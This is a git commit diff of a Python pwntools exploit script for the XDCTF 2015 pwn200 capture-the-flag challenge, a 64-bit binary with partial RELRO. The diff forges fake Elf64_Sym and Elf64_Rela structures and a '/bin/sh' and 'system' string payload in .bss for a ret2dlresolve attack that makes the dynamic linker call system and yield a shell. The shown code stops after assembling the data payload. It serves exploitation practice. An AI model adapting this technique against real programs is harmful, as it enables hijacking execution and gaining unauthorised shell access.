e47d1961c5c665b2ec4e4e732c8f4a0f31d17176
leo <hireedleo@gmail.com>
2021-03-31 08:28:40 -0700

    arrange symbol name string, fake objects of Elf32_Sym and Elf64_Rela on .bss, make them address-aligned well. calculated data payload length.

--- pwn/ctf_wiki/stack/ret2dlresolve/xdctf-2015-pwn200/64/partial_relro/poc.py
+++ pwn/ctf_wiki/stack/ret2dlresolve/xdctf-2015-pwn200/64/partial_relro/poc.py
@@ -1,10 +1,11 @@
 from pwn import *
+import math
 
 def debug_on():
 	if (args.DEBUG):
 		context.log_level = "debug"
 
-g_fname = args.FNAME if (args.FNAME) else "./main_parital_relro_64"
+g_fname = args.FNAME if (args.FNAME) else "./main_partial_relro_64"
 g_elf = ELF(g_fname)
 context.binary = g_elf
 
@@ -22,35 +23,65 @@ def getpid():
 def get_shaddr(elfobj, sec_name):
 	return elfobj.get_section_by_name(sec_name)["sh_addr"]
 
+def get_aligned_addr(base_addr, unaligned_addr, alignment):
+	assert(base_addr <= unaligned_addr)
+	off = unaligned_addr - base_addr
+	idx = math.ceil(off / alignment)
+	return base_addr + idx*alignment
+
 def pwn():
 	# segment writable [0x601000, 0x602000)
 	# .bss [0x601050, 0x601070)
 	bss_addr = g_elf.bss()
-	new_stk = 0
-	data_addr = 0
-	fake_dynstr_addr = 0
+	# data_addr = 0x601070
+	data_addr = bss_addr + 0x20 
+	binsh_addr = data_addr
+	fake_dynstr_addr = binsh_addr + 8
+	# The following 2 addrs are uninitialized and need be aligned.
 	fake_reloc_addr = 0
 	fake_refsym_addr = 0
+	new_stk = 0
+	sh = "/bin/sh\0"
+	str_sym_name = "system\0"
+
+	log.debug("\"%s\"@%#x\n\t\"%s\"@%#x\n", sh, binsh_addr, str_sym_name, fake_dynstr_addr)
 
 	dynstr_shaddr = get_shaddr(g_elf, ".dynstr")
 	dynsym_shaddr = get_shaddr(g_elf, ".dynsym")
 	relplt_shaddr = get_shaddr(g_elf, ".rela.plt")
-	log.debug(".dynstr@%#x\n.dynsym@%#x\n.rela.plt@%#x\n"
+	log.debug(".dynstr@%#x\n\t.dynsym@%#x\n\t.rela.plt@%#x\n"
 		, dynstr_shaddr
 		, dynsym_shaddr
 		, relplt_shaddr
 	)
-	
-	fake_dynstr_off = fake_dynstr_addr - dynstr_shaddr
 
 	# make sure fake_refsym_off % sizeof(Elf64_Sym) == 0,
 	# that is fake_refsym_off % 24 == 0
+	fake_refsym_addr = fake_dynstr_addr + len(str_sym_name)
+	fake_refsym_addr = get_aligned_addr(dynsym_shaddr, fake_refsym_addr, 24)
 	fake_refsym_off = fake_refsym_addr - dynsym_shaddr
+	fake_refsym_idx = fake_refsym_off // 24
+	log.debug("fake_refsym_addr=%#x\n\tfake_refsym_off=%#x\n\tfake_refsym_idx=%#x\n"
+		, fake_refsym_addr
+		, fake_refsym_off
+		, fake_refsym_idx
+	)
 
 	# 64-bit version: make sure fake_reloc_off % sizeof(Elf64_Rela) == 0,
 	# that is fake_reloc_off % 24 == 0
+	fake_reloc_addr = fake_refsym_addr + 24 # fake Elf64_Rela object behind fake Elf64_Sym object.
+	fake_reloc_addr = get_aligned_addr(relplt_shaddr, fake_reloc_addr, 24)
 	fake_reloc_off = fake_reloc_addr - relplt_shaddr
-	
+	fake_reloc_idx = fake_reloc_off // 24 # This is _dl_fixup()'s reloc_arg in 64-bit version.
+	log.debug("fake_reloc_addr=%#x\n\tfake_reloc_off=%#x\n\tfake_reloc_idx=%#x\n"
+		, fake_reloc_addr
+		, fake_reloc_off
+		, fake_reloc_idx
+	)
+
+	fake_dynstr_off = fake_dynstr_addr - dynstr_shaddr	
+	log.debug("fake_dynstr_addr=%#x\n\tfake_dynstr_off=%#x\n", fake_dynstr_addr, fake_dynstr_off)
+
 	# forge fake Elf64_Sym object
 	# typedef struct
 	# {
@@ -68,24 +99,31 @@ def pwn():
 	st_shndx = 0 # SHN_UNDEF, undefined symbol, symbol refered in current module but defined in another.
 	st_value = 0
 	st_size = 0
-	fake_symobj = flat([
+	fake_sym_obj = flat([
 		st_name | (st_info << 32) | (st_other << 40) | (st_shndx << 48),
 		st_value,
 		st_size
 	])	
-	log.debug("fake_symobj:\n\tlength=%d\n", len(fake_symobj))
+	log.debug("fake_sym_obj:\n\tlength=%d\n", len(fake_sym_obj))
 
 
 	# forge fake Elf64_Rela object
-	fake_symidx = fake_refsym_off // len(fake_symobj)
+	fake_symidx = fake_refsym_off // len(fake_sym_obj)
 	r_offset = 0x601018
 	r_info = (fake_symidx << 32) | 0x7
 	fake_reloc_obj = flat(r_offset, r_info, 0)
-	log.debug("fake_reloc_obj:\n\tlength=%d\n", len(fake_reloc_obj))
+	log.debug("fake_reloc_obj:\n\tlength=%d\n\tfake_symidx=%#x\n"
+		, len(fake_reloc_obj)
+		, fake_symidx
+	)
 
-	# forge fake dynamic string table
-	fake_dynstr = g_elf.get_section_by_name(".dynstr").data().replace(b"write", b"system")
-	log.debug("fake_dynstr:\n\tlength=%d\n\tcontents=%s\n", len(fake_dynstr), fake_dynstr)
+	full_data_payload = flat({
+		0:sh,
+		8:str_sym_name,
+		(fake_refsym_addr - data_addr): fake_sym_obj,
+		(fake_reloc_addr - data_addr): fake_reloc_obj
+	})
+	log.debug("full_data_payload's length = %d\n", len(full_data_payload))
 	
 
 if ("__main__" == __name__):
